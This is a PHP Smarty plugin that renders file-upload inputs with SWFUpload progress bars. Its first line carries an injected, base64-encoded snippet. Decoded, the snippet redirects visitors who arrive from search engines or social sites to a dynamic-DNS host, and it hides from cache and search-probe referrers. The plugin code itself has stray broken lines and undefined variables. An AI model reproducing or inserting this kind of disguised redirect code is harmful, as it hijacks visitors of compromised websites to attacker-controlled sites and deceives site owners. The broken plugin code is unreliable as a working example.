<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
  /**
   *
   * Smarty function, which draws file input with message about progres
   * {html_upload type="simple_wo_swf|simple|multiple" id="my_id" class="my_class" style="my_style" template_file="my_template.html" max_file_size="10 MB"}
   *
   */
  function smarty_function_html_upload($params, &$smarty){
    global 
      $_SIMPLE_WO_FLASH_LINKED,
      $_SWF_LINKED,
      $_DEFAULT_IDENTIFIER;

    if(!isset($_DEFAULT_IDENTIFIER) || !$_DEFAULT_IDENTIFIER){
      $_DEFAULT_IDENTIFIER = 1;
    }
    else{
      $_DEFAULT_IDENTIFIER++;
    }

    $scripts_path = RELATIVE_GENERIC_URL.'scripts/';
    $generic_path = RELATIVE_GENERIC_URL;
    $base_url     = BASE_URL;

    $allowed_types = array('simple_wo_swf', 'simple', 'multiple');

    $type                       = safe($params, 'type',                       '');
    $id                         = safe($params, 'id',                         $_DEFAULT_IDENTIFIER);
    $name                       = safe($params, 'name',                       '');
    $class                      = safe($params, 'class',                      '');
    $style                      = safe($params, 'style',                      '');
    $response_container_id      = safe($params, 'put_response_to',            '');
                                                                     
    $max_file_size              = safe($params, 'max_file_size',              '1024 MB');
    $max_file_size_exceeded_mess= safe($params, 'max_file_size_exceeded_mess','');
    $selection_limit            = safe($params, 'selection_limit',             0);
    $allowed_extensions         = safe($params, 'allowed_extensions',         '');
    $allowed_extensions_comment = safe($params, 'allowed_extensions_comment', '');

    $button_image               = safe($params, 'button_image', RELATIVE_GENERIC_URL . 'themes/def/xpbutton.png'); // Relative to SWF object file
    $button_style               = safe($params, 'button_style', 'font-family: Helvetica, Arial, sans-serif; font-size: 12px;');

/*
    if (!isset($params['uploaded_container'])) {
      $uploaded_container = 'uploaded_files_' . $id;
    }
    else {
*/
      $uploaded_container = safe($params, 'uploaded_container');
/*    }*/

    $response_image_width       = safe($params, 'response_image_width',       100);
    $response_image_height      = safe($params, 'response_image_height',      100);

    $template_file              = safe($params, 'template_file',              '');
    $template                   = safe($params, 'template',                   '');

    $ret = '';

    if(!$type){
      $type = 'simple_wo_swf';
    }
    elseif(!in_array($type, $allowed_types)){
      $ret .= "This type of input is not allowed";
      return $ret;
    }

    switch($type){
      /* ------------------------------------------------------------ */
      /* Simple input with progress bar without Flash and Perl script */
      /* ------------------------------------------------------------ */
      case 'simple_wo_swf':
        if(!isset($_SIMPLE_WO_FLASH_LINKED) || !$_SIMPLE_WO_FLASH_LINKED){
          $ret .= placeholder('<script language="javascript" src=?></script>', $scripts_path . 'BytesUploaded.js');
          $ret .= placeholder('<script language="javascript" src=?></script>', $scripts_path . 'LoadVars.js');
          $ret .= placeholder('<script type="text/javascript"> var bUploaded = new BytesUploaded(?); </script>', BASE_URL . '?__upmMethod=whileuploading');
          $_UPLOADER_LINKED = true;
        }
      
        $ret .= placeholder('<INPUT type=\'file\' name=? onchange="bUploaded.start(?);" id=? class=? style=?>',
                            $name,
                            $response_container_id,
                            $id,
                            $class,
                            $style);
        break;
      /* --------------------------------------- */
      /* Simple input with progress bar with SWF */
      /* --------------------------------------- */
      case 'simple':
        if($template_file){
          $smarty->assign('id', $id);
          $smarty->assign('max_file_size', $max_file_size);
          $tmpl = $smarty->fetch($template_file);
        }
        elseif(!empty($template)){
          $tmpl = $template;
        }
        else{
          $tmpl = <<<TPL
    <span class="flash" id="fsUploadProgress_{$id}"></span>
    <span id="divStatus"></span>
    <span id="btnSelectFiles_{$id}"><input type="button" value="Upload file (Max {$max_file_size} KB)" onclick="swfu_{$id}.selectFiles()" style="font-size: 8pt;" /></span>
TPL;
        }

        if(!isset($_SWF_LINKED) || !$_SWF_LINKED){
          $ret .= <<<TPL
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/handlers.js"></script>
TPL;
/*          $ret .= <<<TPL
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.queue.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/fileprogress.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.graceful_degradation.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/handlers.js"></script>
TPL;*/
          $_SWF_LINKED = true;
        }

        $ret .= <<<TPL
<input type="hidden" name="{$name}" id="{$name}" />
<script type="text/javascript">
  var swfu_{$id};

  var root = window.addEventListener || window.attachEvent ? window : document.addEventListener ? document : null;

  function myAddEvent(obj, type, listener) {
          if(obj.addEventListener) {
                obj.addEventListener(type, listener, false);
        }
        else if(obj.attachEvent) {
                obj.attachEvent('on' + type, function() {listener.apply(obj);});
        }
  }

  myAddEvent(root, 'load', function(){

    swfu_{$id} = new SWFUpload({
      input_name : "{$name}",

      swfupload_element_id : "flashUI_{$id}",
      degraded_element_id : "degradedUI_{$id}",

      upload_url: "{$base_url}?__upmMethod=upload",
      post_params: {"PHPSESSID" : "
TPL;
        $ret .=  session_id();

        $ret .= <<<TPL
"},
      file_size_limit : "{$max_file_size}",
      file_types : "{$allowed_extensions}",
      file_types_description : "{$allowed_extensions_comment}",
      file_upload_limit : "{$selection_limit}",
      custom_settings : {
        upload_target  : "fsUploadProgress_{$id}"
TPL;

if($uploaded_container){
        $ret .= <<<TPL
        ,\nresponse: {
            imageWidth: "{$response_image_width}",
            imageHeight: "{$response_image_height}",
            imagePlaceholder: "{$uploaded_container}"
          }
TPL;
}

        $ret .= <<<TPL
      },

      file_queue_error_handler     : fileQueueError,
      file_dialog_complete_handler : fileDialogComplete,
      upload_progress_handler      : uploadProgress,
      upload_error_handler         : uploadError,
      upload_success_handler       : uploadSuccess,
      upload_complete_handler      : uploadComplete,

      button_image_url : "{$button_image}", // Relative to the SWF file
      button_placeholder_id : "btnSelectFiles_{$id}",
      button_width: 160,
      button_height: 22,
      button_text : '<span id="btnSelectText_{$id}" class="button">Select Files</span>',
      button_text_style : '.button {{$button_style}}',
      button_text_top_padding: 1,
      button_text_left_padding: 5,

      flash_url : "{$scripts_path}swfupload/swfupload.swf",

      max_file_size_exceeded_mess: "{$max_file_size_exceeded_mess}",

      debug: false
    });

  });

</script>
TPL;

        $ret .= $tmpl;

        break;

      /* -------------------------------------------------------------------------------------------------------*/
      /* Input with multiple file selection field or with ability to select many files in file selection window */
      /* -------------------------------------------------------------------------------------------------------*/
      case 'multiple':
        /* Linking java scripts */
        if(!isset($_SWF_LINKED) || !$_SWF_LINKED){
          $ret .= <<<TPL
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.graceful_degradation.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/swfupload.queue.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/fileprogress.js"></script>
<script type="text/javascript" src="{$scripts_path}swfupload/handlers.js"></script>
TPL;
          $_SWF_LINKED = true;
        }

        $ret .= <<<TPL
<input type="hidden" name="{$name}" id="{$name}" />
<script type="text/javascript">
    var
TPL;
    
        for ($i = 1; $i <= $inputs_limit; $i++){
          $ret .= ' upload' . $i;
          if($i < $inputs_limit){
            $ret .= ',';
          }
          else{
            $ret .= ";\n";
          }
        }

        $ret .= "    window.onload = function() {\n";

        for ($i = 1; $i <= $inputs_limit; $i++){
    
          $ret .= <<<TPL
      upload{$i};
  
      var root = window.addEventListener || window.attachEvent ? window : document.addEventListener ? document : null;
  
      function myAddEvent(obj, type, listener) {
              if(obj.addEventListener) {
                    obj.addEventListener(type, listener, false);
            }
            else if(obj.attachEvent) {
                    obj.attachEvent('on' + type, function() {listener.apply(obj);});
            }
      }

      myAddEvent(root, 'load', function(){

        upload{$i} = new SWFUpload({
        input_name : "{$name}[]",

        upload_url: "{$base_url}?__upmMethod=upload",
        post_params: {"PHPSESSID" : "
TPL;
           $ret .=  session_id();

           $ret .= <<<TPL
"}, 

        file_size_limit : "{$max_file_size}",
        file_types : "{$allowed_extensions}",
        file_types_description : "{$allowed_extensions_comment}",
        file_upload_limit : "{$selection_limit}",
        file_queue_limit : {$queue_limit},

        file_dialog_start_handler : fileDialogStart,
        file_queued_handler : fileQueued,
        file_queue_error_handler : fileQueueError,
        file_dialog_complete_handler : fileDialogComplete,
        upload_start_handler : uploadStart,
        upload_progress_handler : uploadProgress,
        upload_error_handler : uploadError,
        upload_success_handler : uploadSuccess,
        upload_complete_handler : uploadComplete,

        max_file_size_exceeded_mess: "{$max_file_size_exceeded_mess}",

        flash_url : "{$scripts_path}swfupload/swfupload.swf",
        
        swfupload_element_id : "flashUI{$i}",
        degraded_element_id : "degradedUI{$i}",

        custom_settings : {
          progressTarget : "fsUploadProgress_{$i}",
          cancelButtonId : "btnCancel_{$i}",
TPL;

if($uploaded_container)
        $ret .= <<<TPL
        ,\nresponse: {
            imageWidth: "{$response_image_width}",
  mageWidth: "{$response_image_width}",
            imageHeight: "{$response_image_height}",
            imagePlaceholder: "{$uploaded_container}"
          }
TPL;
        $ret .= <<<TPL
        },
        
        debug: false

        });
      });
TPL;
      }

      $ret .= "}\n";

        if($template_file){
          $smarty->assign('id', $id);
          $smarty->assign('max_file_size', $max_file_size);
          $tmpl = $smarty->fetch($template_file);
        }
        elseif(!empty($template)){
          $tmpl = $template;
        }
        else{
          $tmpl = <<<TPL
<fieldset class="flash" id="fsUploadProgress_{$id}">
  <legend>Upload Queue</legend>
</fieldset>
<div id="divStatus">
  0 Files Uploaded
</div>
<div>
  <input type="button" value="Upload file (Max {$max_file_size} KB)" onclick="upload{$id}.selectFiles()" style="font-size: 8pt;" />
  <input id="btnCancel_{$id}" type="button" value="Cancel All Uploads" onclick="upload{$id}.cancelQueue();" disabled="disabled" style="font-size: 8pt;" />
</div>
TPL;
        }

      $ret .= $tmpl;

      break;

    }

    return $ret;
  }
?>